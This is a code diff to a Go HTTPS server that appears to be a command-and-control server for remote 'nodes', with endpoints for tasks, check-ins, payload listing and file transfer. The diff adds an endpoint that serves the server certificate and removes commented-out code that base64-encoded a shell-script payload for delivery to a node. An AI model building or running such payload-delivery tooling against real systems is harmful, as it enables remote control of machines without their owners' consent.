@@ -59,8 +59,22 @@ func handleRequests() {
 
 	// Console endpoints
 	http.HandleFunc("/list_payloads", list_payloads)
+	http.HandleFunc("/show_cert", show_cert)
 
 	log.Fatal(http.ListenAndServeTLS(":8081", "server.crt", "server.key", nil))
+}
+
+func show_cert(w http.ResponseWriter, req *http.Request) {
+
+	certString, err := ioutil.ReadFile("server.crt")
+	if err != nil {
+
+		fmt.Println("Error reading cirtfile")
+		return
+	}
+
+	fmt.Fprintf(w, string(certString))
+
 }
 
 func get_tasks(w http.ResponseWriter, req *http.Request) {
@@ -300,31 +314,6 @@ func node_response(w http.ResponseWriter, req *http.Request) {
 
 }
 
-// // Handles gathering a file for the node to recieve
-// func nodeSendFile(w http.ResponseWriter, req *http.Request) {
-
-// 	// Decode the json body
-// 	decoder := json.NewDecoder(req.Body)
-// 	var node check_in
-// 	err := decoder.Decode(&node)
-// 	if err != nil {
-// 		panic(err)
-// 	}
-
-// 	script := read_script("payloads/shell.sh")
-
-// 	var response = []byte(`
-// 	{
-// 		"ID": "` + node.ID + `",
-// 		"command": "File",
-// 		"details": "` + script + `"
-// 	}`)
-
-// 	// Sending the reponse
-// 	fmt.Fprintf(w, string(response))
-
-// }
-
 func get_file_handler(w http.ResponseWriter, r *http.Request) {
 	// Parse the multipart form
 	err := r.ParseMultipartForm(32 << 20) // 32 MB limit
@@ -399,23 +388,6 @@ func send_file_handler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 }
-
-// // Reads and encodes a script. Read to send to the node
-// func read_script(path string) string {
-
-// 	// Read the file
-// 	bFile, _ := ioutil.ReadFile(path)
-// 	script := string(bFile)
-// 	// script = strings.Replace(script, "\n", "", -1)
-
-// 	// fmt.Println(script)
-
-// 	// here is where we turn the file into some nice data I think
-// 	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))
-
-// 	return encoded_script
-
-// }
 
 // sliceToJSON converts a slice of structs to a JSON string
 func sliceToJSON(slice interface{}) (string, error) {
